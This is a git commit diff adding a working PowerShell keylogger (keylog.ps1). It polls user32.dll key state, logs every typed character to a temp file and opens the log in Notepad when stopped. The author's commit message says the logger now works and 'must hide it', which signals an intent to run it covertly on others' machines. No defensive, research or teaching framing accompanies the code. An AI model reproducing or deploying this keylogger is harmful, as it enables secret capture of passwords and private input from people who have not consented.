631336d175d1b9a2619c2ca5f0d674122ebfaecb
jacob cyr <jacobncyr@outlook.com>
2023-03-09 06:41:13 -0600

    got keylog to work now must hide it

--- keylog.ps1
+++ keylog.ps1
@@ -1,28 +1,71 @@
-# Define the path and filename for the output file
-$outputFile = "%USERPROFILE\Desktop"
+#requires -Version 2
+function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
+{
+  # Signatures for API Calls
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
 
-# Start listening for key events
-Add-Type -AssemblyName System.Windows.Forms
-$global:keyState = [Windows.Forms.Control]::ModifierKeys
+  # load signatures and make members available
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    
+  # create output file
+  $null = New-Item -Path $Path -ItemType File -Force
 
-# Define the function to handle key events
-Function OnKeyEvent($event) {
-    # Open the output file in append mode
-    $stream = [System.IO.File]::Open($outputFile, "Append", "Write")
+  try
+  {
+    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
 
-    # Write the key event to the output file
-    $stream.Write("{0},{1}`r`n" -f $event.KeyData, $global:keyState)
+    # create endless loop. When user presses CTRL+C, finally-block
+    # executes and shows the collected key presses
+    while ($true) {
+      Start-Sleep -Milliseconds 40
+      
+      # scan all ASCII codes above 8
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        # get current key state
+        $state = $API::GetAsyncKeyState($ascii)
 
-    # Close the output file
-    $stream.Close()
+        # is key pressed?
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+
+          # translate scan code to real code
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+          # get keyboard state for virtual keys
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+
+          # prepare a StringBuilder to receive input key
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+
+          # translate virtual key
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+          if ($success) 
+          {
+            # add key to logger file
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+          }
+        }
+      }
+    }
+  }
+  finally
+  {
+    # open logger file in Notepad
+    notepad $Path
+  }
 }
 
-# Register the key event handler
-$handler = [Windows.Forms.KeyEventHandler]::new({OnKeyEvent($_)})
-Add-EventSubscriber -InputObject ([Windows.Forms.Control]::FromHandle((Get-Process -id $pid).MainWindowHandle)) `
-    -EventName KeyDown -SourceIdentifier KeyListener -Action $handler
-
-# Wait for input
-while ($true) {
-    Start-Sleep -Seconds 1
-}
+# records all key presses until script is aborted by pressing CTRL+C
+# will then open the file with collected key codes
+Start-KeyLogger
